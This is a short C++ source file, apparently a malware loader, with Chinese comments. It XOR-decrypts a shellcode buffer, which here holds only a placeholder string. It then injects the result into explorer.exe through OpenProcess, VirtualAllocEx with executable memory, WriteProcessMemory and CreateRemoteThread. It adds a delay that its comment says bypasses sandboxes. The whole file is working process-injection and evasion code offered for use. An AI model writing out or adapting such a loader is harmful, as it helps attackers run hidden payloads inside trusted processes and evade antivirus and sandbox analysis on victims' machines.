// Shellcode-test.cpp : coded by pcz
//
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

//xor的密钥
#define KEY 0x99
//经过xor加密的shellcode
unsigned char buf[] = "ur shellcode put in here lol";
typedef void(*PFN_F00);

#include <stdio.h>
#include <Windows.h>


int main()
{
    //解密xor 
    //src : https://github.com/shanfenglan/xor_shellcode

    unsigned char buff[sizeof(buf)];
    for (int i = 0; i < sizeof(buf) - 1; i++)
    {
        buff[i] = buf[i] ^ KEY;
    }

    //获取进程
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    //取进程pid
    BOOL bret = Process32First(hSnap, &pe32);
    while (bret) {
        bret = Process32Next(hSnap, &pe32);
        if (wcscmp(pe32.szExeFile, L"explorer.exe") == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hprocess == INVALID_HANDLE_VALUE) {
        //printf("hprocess err");
        //这里是无限时间的睡眠
        Sleep(-1);
    }

    //申请空间
    LPVOID lpaddr = VirtualAllocEx(hprocess, NULL, sizeof(buff) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (lpaddr == NULL) {
        //printf("lpaddr Err");
        //这里是无限时间的睡眠
        Sleep(-1);
    }

    //可以有效的bypass一些沙箱
    Sleep(2000);

    //写入数据
    WriteProcessMemory(hprocess, lpaddr, (LPVOID)buff, sizeof(buff) + 1, NULL);

    //创建远线程
    LPVOID handle = CreateRemoteThread(hprocess, 0, 0, (LPTHREAD_START_ROUTINE)lpaddr, NULL, 0, NULL);

    if (NULL == handle)
    {
        //printf("handle Err");
        //这里是无限时间的睡眠
        Sleep(-1);
    }

    //等待线程结束
    WaitForSingleObject(handle, -1);


    return 0;
}
